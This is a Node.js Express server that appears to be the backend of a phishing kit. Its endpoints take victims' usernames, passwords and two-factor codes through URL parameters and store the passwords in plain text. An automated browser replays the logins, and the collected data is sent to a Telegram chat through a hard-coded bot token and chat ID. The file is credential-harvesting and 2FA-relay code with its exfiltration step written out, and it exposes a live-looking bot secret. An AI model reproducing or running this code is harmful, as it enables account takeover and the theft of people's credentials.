const express = require('express');
const app = express();
const port = 3000;
const fsSync = require('fs');
const fs = require('fs').promises;
const TelegramBot = require('node-telegram-bot-api');
// Read the JSON file
const token = '6996850800:AAGua3pvelxx7alcM_aPiZWUP-3-UnvHw4M';
const filePath = './cache.json';
const jsonData = require(filePath);
const typeFilePath = './type.json';
const typeJsonData = require(typeFilePath);
// const instanceFilePath = './instance.json';
// const instanceJsonData = require(instanceFilePath);
var usedInstances = 0;
const { automateBrowser } = require('./browser');
// Define your API endpoint
async function handleRequest(req, res) {
    const username = req.params.username;
    const password = req.params.password;

    jsonData[username] = null;
    jsonData[username+'_cookies'] = null;
    jsonData[username+'_pass'] = password;
    typeJsonData[username] = null;
    // Write the updated content back to the file
    fsSync.writeFileSync(filePath, JSON.stringify(jsonData, null, 2));
    fsSync.writeFileSync(typeFilePath, JSON.stringify(typeJsonData, null, 2));
    // fsSync.writeFileSync(instanceFilePath, JSON.stringify(instanceJsonData, null, 2));
    automateBrowser(username, password);
        // Wait for the type to be not null
        const type = await checkValue(username);

        // Send response only when type is not null
        if (type === 404) {
            console.log('wrong creds');
            res.json({ message: 'Login request sent to browser', twofatype: null });
        }
        if (type !== null && type !== 404) {
            console.log('success creds');
            res.json({ message: 'Login request sent to browser', twofatype: type });
        }
}

app.get('/api/dat/:username/:password', handleRequest);

app.get('/api/set/twofa/:username/:twofa', (req, res) => {
    const twofa = req.params.twofa;
    const username = req.params.username;
    // Modify the content
    jsonData[username] = twofa;

    // Write the updated content back to the file
    fsSync.writeFileSync(filePath, JSON.stringify(jsonData, null, 2));
    setTimeout(function () {
        checkJson().then(jsonData => {
            if (jsonData[username] != null) {
                sendJsonFile()
                res.json({ message: '2fa set successfully', success: true });
            }else{
                res.json({ message: 'error', success: false });
            }
        });
    },3000)
});

// Start the server
app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});

async function checkJson() {
    const filePath = './cache.json';

    try {
        // Read the file asynchronously
        const data = await fs.readFile(filePath, 'utf8');

        // Parse the JSON data
        const jsonData = JSON.parse(data);
        // if (jsonData.twofa == null) {
        //     return null;
        // }

        // Return the parsed JSON
        return jsonData;
    } catch (error) {
        console.error('Error reading or parsing JSON file:', error);
        return null;
    }
}

async function checkValue(key) {
    const filePath = './type.json';
    const startTime = Date.now();
    while (true) {
        try {
            if (Date.now() - startTime >= 20000) {
                console.log('20 seconds have passed');
                return 404;
                break; // Exit the loop if 10 seconds have passed
            }
            console.log('instance 1')
            // Read the file asynchronously
            const data = await fs.readFile(filePath, 'utf8');

            // Parse the JSON data
            const jsonData = JSON.parse(data);

            // Check if the value of the specified key is not null
            if (jsonData[key] !== null) {
                // If the value is not null, send a response
                console.log(`Value for key "${key}" is not null: ${jsonData[key]}`);
                // Here you can send a response using any method you prefer
                return jsonData[key];
                break; // Exit the loop once the value is not null
            } else {
                // If the value is null, log a message and wait for some time before checking again
                console.log(`Value for key "${key}" is still null. Waiting for the value to change...`);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 5 seconds before checking again
            }
        } catch (error) {
            console.error('Error reading or parsing JSON file:', error);
            // You might want to handle this error accordingly
            break; // Exit the loop in case of an error
        }
    }
}

async function checkValue2(key) {
    const filePath = './type.json';
    const startTime = Date.now();
    while (true) {
        try {
            if (Date.now() - startTime >= 10000) {
                console.log('10 seconds have passed');
                break; // Exit the loop if 10 seconds have passed
            }
            console.log('instance 2')
            // Read the file asynchronously
            const data = await fs.readFile(filePath, 'utf8');

            // Parse the JSON data
            const jsonData = JSON.parse(data);

            // Check if the value of the specified key is not null
            if (jsonData[key] !== null) {
                // If the value is not null, send a response
                console.log(`Value for key "${key}" is not null: ${jsonData[key]}`);
                // Here you can send a response using any method you prefer
                return jsonData[key];
                break; // Exit the loop once the value is not null
            } else {
                // If the value is null, log a message and wait for some time before checking again
                console.log(`Value for key "${key}" is still null. Waiting for the value to change...`);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 5 seconds before checking again
            }
        } catch (error) {
            console.error('Error reading or parsing JSON file:', error);
            // You might want to handle this error accordingly
            break; // Exit the loop in case of an error
        }
    }
}

async function checkValue3(key) {
    const filePath = './type.json';

    while (true) {
        try {
            console.log('instance 3')
            // Read the file asynchronously
            const data = await fs.readFile(filePath, 'utf8');

            // Parse the JSON data
            const jsonData = JSON.parse(data);

            // Check if the value of the specified key is not null
            if (jsonData[key] !== null) {
                // If the value is not null, send a response
                console.log(`Value for key "${key}" is not null: ${jsonData[key]}`);
                // Here you can send a response using any method you prefer
                return jsonData[key];
                break; // Exit the loop once the value is not null
            } else {
                // If the value is null, log a message and wait for some time before checking again
                console.log(`Value for key "${key}" is still null. Waiting for the value to change...`);
                await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 5 seconds before checking again
            }
        } catch (error) {
            console.error('Error reading or parsing JSON file:', error);
            // You might want to handle this error accordingly
            break; // Exit the loop in case of an error
        }
    }
}

async function sendJsonFile() {
    const userChatId = '1169195396';
    console.log('yooooo111');
    const bot = new TelegramBot(token, {polling: true});
    try {
        await fs.access(typeFilePath);  // Waits for the file check
        console.log('yooooo222');

        // Send the JSON file to the user
        await bot.sendDocument(userChatId, typeFilePath)
            .then(() => {
                console.log("File sent successfully!");
            })
            .catch((error) => {
                console.error("Error sending file:", error);
            });
        console.log("File sent successfully!");
    } catch (err) {
        console.error("File doesn't exist or error sending file:", err);
    }
}


